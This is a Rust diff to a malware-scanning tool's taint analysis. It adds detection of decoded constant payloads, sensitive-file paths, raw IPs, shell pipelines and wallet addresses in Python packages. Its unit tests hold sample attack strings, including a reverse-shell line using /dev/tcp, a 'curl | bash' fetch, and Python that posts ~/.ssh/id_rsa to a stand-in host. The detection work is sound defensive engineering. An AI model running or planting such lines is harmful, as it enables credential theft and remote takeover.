@@ -68,10 +68,15 @@ impl Default for ReachLimits {
 ///   from being counted a second time.
 /// - `PhaseRoot` yields one source per root in `pg.phases.roots`; its `node` is the root's
 ///   **call-graph** node, which is why `data_paths` skips it.
-/// - `SensitiveFile`, `DecodedLiteral` and `SuspiciousLiteral` need the value of a literal
-///   argument, not a name, and are **not matched yet**: they yield nothing. The literal is
-///   already in the graph (a `Literal` node's label is its value); the matching belongs to
-///   the rule catalogue's block and is recorded as an open request in DECISIONS.md.
+/// - `SensitiveFile` and `SuspiciousLiteral` match a `Literal` node on its value (the label
+///   is the unquoted string): a path under the pattern for the first, a shape named by the
+///   pattern for the second (see [`literal_matches`]).
+/// - `DecodedLiteral` matches the result of a call to a [`DECODERS`] entry whose input is
+///   constant: every node that flows into it, traced back, starts at a literal (see
+///   [`is_decoded_constant`]). Matched in the data-flow graph rather than by
+///   [`crate::fold::fold_literal`], because the payload almost always passes through a
+///   variable first (`_BLOB = "…"; exec(b64decode(_BLOB))`) and folding sees one expression
+///   at a time. The callee label is canonical, so `import base64 as b` is resolved here.
 pub fn find_sources(pg: &PackageGraph, patterns: &[SourcePattern]) -> Vec<TaintSource> {
     let d = &pg.dfg.graph;
     let mut out = Vec::new();
@@ -93,9 +98,36 @@ pub fn find_sources(pg: &PackageGraph, patterns: &[SourcePattern]) -> Vec<TaintS
                     });
                 }
             }
-            TaintSourceKind::SensitiveFile
-            | TaintSourceKind::DecodedLiteral
-            | TaintSourceKind::SuspiciousLiteral => {}
+            TaintSourceKind::SensitiveFile | TaintSourceKind::SuspiciousLiteral => {
+                for i in d.node_indices() {
+                    let n = &d[i];
+                    if n.kind == FlowNodeKind::Literal && literal_matches(p, &n.label) {
+                        out.push(TaintSource {
+                            kind: p.kind,
+                            pattern: QualifiedName::new(p.pattern),
+                            location: location(pg, n.file, n.span),
+                            node: i,
+                        });
+                    }
+                }
+            }
+            TaintSourceKind::DecodedLiteral => {
+                for i in d.node_indices() {
+                    let n = &d[i];
+                    let decoder = n.kind == FlowNodeKind::CallResult
+                        && DECODERS
+                            .iter()
+                            .any(|dec| QualifiedName::new(n.label.as_str()).is_under(dec));
+                    if decoder && is_decoded_constant(pg, i) {
+                        out.push(TaintSource {
+                            kind: p.kind,
+                            pattern: QualifiedName::new(n.label.as_str()),
+                            location: location(pg, n.file, n.span),
+                            node: i,
+                        });
+                    }
+                }
+            }
             _ => {
                 for i in d.node_indices() {
                     let n = &d[i];
@@ -122,6 +154,203 @@ pub fn find_sources(pg: &PackageGraph, patterns: &[SourcePattern]) -> Vec<TaintS
     out.sort_by(|a, b| (&a.location, a.node, a.kind).cmp(&(&b.location, b.node, b.kind)));
     out.dedup_by(|a, b| a.node == b.node && a.kind == b.kind);
     out
+}
+
+/// The decoders whose result, applied to a constant, is a `DecodedLiteral`: ADR-018's list
+/// minus the entries that are not decoders (`chr`, `join`, reversal and re-encoding hide
+/// nothing from a reader). Canonical names, matched with `is_under`.
+pub const DECODERS: &[&str] = &[
+    "base64.b64decode",
+    "base64.standard_b64decode",
+    "base64.urlsafe_b64decode",
+    "base64.b32decode",
+    "base64.b16decode",
+    "base64.b85decode",
+    "base64.a85decode",
+    "base64.decodebytes",
+    "binascii.unhexlify",
+    "binascii.a2b_base64",
+    "binascii.a2b_hex",
+    "bytes.fromhex",
+    "codecs.decode",
+    "zlib.decompress",
+    "gzip.decompress",
+    "bz2.decompress",
+    "lzma.decompress",
+];
+
+/// How many nodes [`is_decoded_constant`] visits before giving up. The walk goes backwards
+/// over an attacker-written graph, so it is bounded like every other search here; giving up
+/// answers "not constant", which misses a source rather than inventing one.
+const MAX_CONSTANT_WALK: usize = 4096;
+
+/// Whether everything that flows into `node` starts at a constant. Walks incoming edges
+/// back to the nodes nothing flows into, and requires each of them to be a `Literal`, or a
+/// `Definition` bound to a value that produced no node at all (`_CODES = [99, 72, …]`:
+/// numbers have no data-flow node, so the binding is a leaf). Any other leaf — a call
+/// result, an external read, a parameter nobody passes — is data from outside, and a
+/// decoder applied to it is a dropper's shape, not an obfuscated literal.
+fn is_decoded_constant(pg: &PackageGraph, node: NodeIndex) -> bool {
+    let d = &pg.dfg.graph;
+    let mut seen = BTreeSet::from([node]);
+    let mut stack = vec![node];
+    let mut leaves = 0usize;
+    while let Some(n) = stack.pop() {
+        let inputs: Vec<NodeIndex> = d.neighbors_directed(n, Direction::Incoming).collect();
+        if inputs.is_empty() {
+            let constant =
+                n != node && matches!(d[n].kind, FlowNodeKind::Literal | FlowNodeKind::Definition);
+            if !constant {
+                return false;
+            }
+            leaves += 1;
+            continue;
+        }
+        for i in inputs {
+            if seen.insert(i) {
+                if seen.len() > MAX_CONSTANT_WALK {
+                    return false;
+                }
+                stack.push(i);
+            }
+        }
+    }
+    leaves > 0
+}
+
+/// Whether a string literal matches a `SensitiveFile` or `SuspiciousLiteral` pattern.
+///
+/// `SensitiveFile` patterns are paths. A home-relative pattern (`~/.ssh`) matches a literal
+/// that, after `\` becomes `/` and a leading `~/`, `$HOME/` or `%USERPROFILE%/` is dropped,
+/// is the pattern's path or lies under it. Dropping the prefix is deliberate: the home
+/// directory is usually computed (`os.path.join(Path.home(), ".ssh/id_rsa")`), so the
+/// literal starts at `.ssh`. An absolute or bare pattern (`/etc/passwd`, `.env`) matches the
+/// literal itself or a path ending in it.
+///
+/// `SuspiciousLiteral` patterns name a shape: `<literal:url-not-index>`,
+/// `<literal:raw-ip>`, `<literal:shell-pipeline>`, `<literal:wallet-address>`,
+/// `<literal:home-or-root-path>`.
+pub fn literal_matches(pattern: &SourcePattern, value: &str) -> bool {
+    match pattern.kind {
+        TaintSourceKind::SensitiveFile => sensitive_path(pattern.pattern, value),
+        TaintSourceKind::SuspiciousLiteral => match pattern.pattern {
+            "<literal:url-not-index>" => url_not_index(value),
+            "<literal:raw-ip>" => raw_ip(value),
+            "<literal:shell-pipeline>" => shell_pipeline(value),
+            "<literal:wallet-address>" => wallet_address(value),
+            "<literal:home-or-root-path>" => home_or_root(value),
+            _ => false,
+        },
+        _ => false,
+    }
+}
+
+/// The hosts a URL literal may name without being suspicious. The matcher lives here, so
+/// the list does too; the rules crate re-exports it.
+pub const OFFICIAL_INDEX_HOSTS: &[&str] = &["pypi.org", "files.pythonhosted.org", "test.pypi.org"];
+
+fn normalised(value: &str) -> String {
+    value.trim().replace('\\', "/")
+}
+
+fn under(path: &str, prefix: &str) -> bool {
+    !prefix.is_empty()
+        && path
+            .strip_prefix(prefix)
+            .is_some_and(|rest| rest.is_empty() || rest.starts_with('/'))
+}
+
+fn sensitive_path(pattern: &str, value: &str) -> bool {
+    let v = normalised(value);
+    match pattern.strip_prefix("~/") {
+        Some(relative) => {
+            let rest = ["~/", "$HOME/", "${HOME}/", "%USERPROFILE%/"]
+                .iter()
+                .find_map(|prefix| v.strip_prefix(prefix))
+                .unwrap_or(&v);
+            under(rest, relative)
+        }
+        None => under(&v, pattern) || v.ends_with(&format!("/{pattern}")),
+    }
+}
+
+fn url_not_index(value: &str) -> bool {
+    let v = value.trim();
+    let Some(rest) = ["http://", "https://", "ftp://"]
+        .iter()
+        .find_map(|scheme| v.strip_prefix(scheme))
+    else {
+        return false;
+    };
+    let authority = rest.split(['/', '?', '#']).next().unwrap_or_default();
+    let host_port = authority.rsplit('@').next().unwrap_or_default();
+    let host = host_port
+        .split(':')
+        .next()
+        .unwrap_or_default()
+        .to_ascii_lowercase();
+    !host.is_empty() && !OFFICIAL_INDEX_HOSTS.contains(&host.as_str())
+}
+
+fn raw_ip(value: &str) -> bool {
+    let v = value.trim();
+    let host = match v.rsplit_once(':') {
+        Some((h, port)) if !port.is_empty() && port.chars().all(|c| c.is_ascii_digit()) => h,
+        _ => v,
+    };
+    let parts: Vec<&str> = host.split('.').collect();
+    parts.len() == 4
+        && parts
+            .iter()
+            .all(|p| !p.is_empty() && p.len() <= 3 && p.parse::<u8>().is_ok())
+        // Loopback and the unspecified address are how local servers are written.
+        && !host.starts_with("127.")
+        && host != "0.0.0.0"
+}
+
+fn shell_pipeline(value: &str) -> bool {
+    let v = value.to_ascii_lowercase();
+    let fetches = v.contains("curl ") || v.contains("wget ");
+    let piped_to_shell = v.split('|').skip(1).any(|segment| {
+        let program = segment.split_whitespace().next().unwrap_or_default();
+        let program = program.rsplit('/').next().unwrap_or_default();
+        matches!(program, "sh" | "bash" | "zsh" | "python" | "python3")
+    });
+    (fetches && piped_to_shell) || v.contains("/dev/tcp/")
+}
+
+fn wallet_address(value: &str) -> bool {
+    let v = value.trim();
+    let base58 = |s: &str| {
+        s.chars()
+            .all(|c| c.is_ascii_alphanumeric() && !matches!(c, '0' | 'O' | 'I' | 'l'))
+    };
+    let bitcoin =
+        (v.starts_with('1') || v.starts_with('3')) && (26..=35).contains(&v.len()) && base58(v);
+    let bech32 = v.len() >= 14
+        && v.len() <= 74
+        && v.starts_with("bc1")
+        && v[3..]
+            .chars()
+            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit());
+    let ethereum =
+        v.len() == 42 && v.starts_with("0x") && v[2..].chars().all(|c| c.is_ascii_hexdigit());
+    bitcoin || bech32 || ethereum
+}
+
+fn home_or_root(value: &str) -> bool {
+    let v = normalised(value);
+    if v.is_empty() {
+        return false;
+    }
+    let trimmed = v.trim_end_matches('/');
+    let drive =
+        trimmed.len() == 2 && trimmed.ends_with(':') && trimmed.as_bytes()[0].is_ascii_alphabetic();
+    drive
+        || matches!(
+            trimmed,
+            "" | "~" | "$HOME" | "${HOME}" | "%USERPROFILE%" | "/home" | "/root" | "/Users"
+        )
 }
 
 /// Finds every sink occurrence, in canonical order: a call whose canonical callee
@@ -357,7 +586,9 @@ fn data_path(
         detail: Some(source.pattern.to_string()),
     }];
     let mut confidence = Confidence::Resolved;
-    let mut obfuscated = false;
+    // A decoded constant is obfuscated by definition, whether or not a further encoder is
+    // crossed on the way to the sink.
+    let mut obfuscated = source.kind == TaintSourceKind::DecodedLiteral;
     for e in edges {
         let w = &d[*e];
         let (_, to) = d.edge_endpoints(*e).expect("edge from this graph");
@@ -514,6 +745,137 @@ mod tests {
         let (_, _, p2) = paths(src);
         assert_eq!(p1, p2);
         assert_eq!(p1.len(), 2);
+    }
+
+    // ── Literal-valued sources ──────────────────────────────────────────────────────
+
+    const DECODED: &[SourcePattern] = &[SourcePattern {
+        kind: TaintSourceKind::DecodedLiteral,
+        pattern: "<fold>",
+    }];
+    const EXEC: &[SinkPattern] = &[SinkPattern {
+        kind: TaintSinkKind::CodeExecution,
+        pattern: "exec",
+        arg: Some(0),
+    }];
+
+    fn decoded_paths(src: &str) -> (Vec<TaintSource>, Vec<ReachabilityPath>) {
+        let g = graph_from_sources(&[("pkg/a.py", src)]);
+        let sources = find_sources(&g, DECODED);
+        let sinks = find_sinks(&g, EXEC);
+        let p = data_paths(&g, &sources, &sinks, &ReachLimits::default());
+        (sources, p)
+    }
+
+    // The fixture shape: the blob goes through a variable, and the module is aliased. Neither
+    // stops the match, because the graph links the variable and canonicalises the callee.
+    #[test]
+    fn decoded_constant_through_variable_and_alias_reaches_exec() {
+        let (sources, p) = decoded_paths(
+            "import base64 as b\n_BLOB = 'aW1wb3J0IG9z'\nexec(b.b64decode(_BLOB).decode('utf-8'))\n",
+        );
+        assert_eq!(sources.len(), 1);
+        assert_eq!(sources[0].pattern.as_str(), "base64.b64decode");
+        assert_eq!(p.len(), 1);
+        assert!(p[0].obfuscated, "a decoded constant is obfuscated");
+    }
+
+    // A decoder applied to downloaded bytes is a dropper, not an obfuscated literal: the
+    // input starts at a call result, not a constant.
+    #[test]
+    fn decoder_over_network_data_is_not_a_decoded_literal() {
+        let (sources, _) = decoded_paths(
+            "import base64, requests\nexec(base64.b64decode(requests.get('https://c.invalid/').content))\n",
+        );
+        assert!(sources.is_empty());
+    }
+
+    // Numbers have no data-flow node, so a list of char codes is a constant leaf; the
+    // chr-join stage feeding a decoder still counts as constant input.
+    #[test]
+    fn chr_join_of_a_number_list_is_constant_input() {
+        let (sources, p) = decoded_paths(
+            "import base64\n_CODES = [97, 87, 49]\n_S = ''.join(chr(c) for c in _CODES)\nexec(base64.b64decode(_S))\n",
+        );
+        assert_eq!(sources.len(), 1);
+        assert_eq!(p.len(), 1);
+    }
+
+    // SensitiveFile: the path literal flows through expanduser, open and read into the
+    // request, which is the whole of EXF-002.
+    #[test]
+    fn sensitive_file_content_reaches_network() {
+        let g = graph_from_sources(&[(
+            "pkg/a.py",
+            "import os, requests\np = os.path.expanduser('~/.ssh/id_rsa')\nwith open(p, 'rb') as fh:\n    key = fh.read()\nrequests.post('https://c.invalid/', data=key)\n",
+        )]);
+        let sources = find_sources(
+            &g,
+            &[SourcePattern {
+                kind: TaintSourceKind::SensitiveFile,
+                pattern: "~/.ssh",
+            }],
+        );
+        assert_eq!(sources.len(), 1);
+        let p = data_paths(&g, &sources, &find_sinks(&g, POST), &ReachLimits::default());
+        assert_eq!(p.len(), 1);
+    }
+
+    #[test]
+    fn literal_shapes() {
+        let file = |pat| SourcePattern {
+            kind: TaintSourceKind::SensitiveFile,
+            pattern: pat,
+        };
+        let shape = |pat| SourcePattern {
+            kind: TaintSourceKind::SuspiciousLiteral,
+            pattern: pat,
+        };
+        assert!(literal_matches(&file("~/.ssh"), "~/.ssh/id_rsa"));
+        assert!(literal_matches(&file("~/.ssh"), ".ssh"));
+        assert!(literal_matches(&file("~/.aws"), "$HOME/.aws/credentials"));
+        assert!(!literal_matches(&file("~/.ssh"), ".sshd_config"));
+        assert!(literal_matches(&file("/etc/passwd"), "/etc/passwd"));
+        assert!(literal_matches(&file(".env"), "/srv/app/.env"));
+        assert!(!literal_matches(&file(".env"), ".envrc"));
+
+        let url = shape("<literal:url-not-index>");
+        assert!(literal_matches(&url, "http://drop.example.invalid/k"));
+        assert!(!literal_matches(&url, "https://pypi.org/simple/"));
+        assert!(!literal_matches(&url, "not a url"));
+
+        let ip = shape("<literal:raw-ip>");
+        assert!(literal_matches(&ip, "203.0.113.9"));
+        assert!(literal_matches(&ip, "203.0.113.9:4444"));
+        assert!(!literal_matches(&ip, "127.0.0.1"));
+        assert!(!literal_matches(&ip, "1.2.3"));
+        assert!(!literal_matches(&ip, "2.0.10.1a"));
+
+        let sh = shape("<literal:shell-pipeline>");
+        assert!(literal_matches(&sh, "curl -s http://x.invalid/i.sh | bash"));
+        assert!(literal_matches(
+            &sh,
+            "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"
+        ));
+        assert!(!literal_matches(&sh, "git describe --tags"));
+
+        let wallet = shape("<literal:wallet-address>");
+        assert!(literal_matches(
+            &wallet,
+            "0x52908400098527886E0F7030069857D2E4169EE7"
+        ));
+        assert!(literal_matches(
+            &wallet,
+            "1BoatSLRHtKNngkdXEeobR76b53LETtpyT"
+        ));
+        assert!(!literal_matches(&wallet, "0xdeadbeef"));
+
+        let root = shape("<literal:home-or-root-path>");
+        assert!(literal_matches(&root, "~"));
+        assert!(literal_matches(&root, "/"));
+        assert!(literal_matches(&root, "C:\\"));
+        assert!(!literal_matches(&root, "build/"));
+        assert!(!literal_matches(&root, ""));
     }
 
     // Control reachability: from the install root to a network sink through a helper.
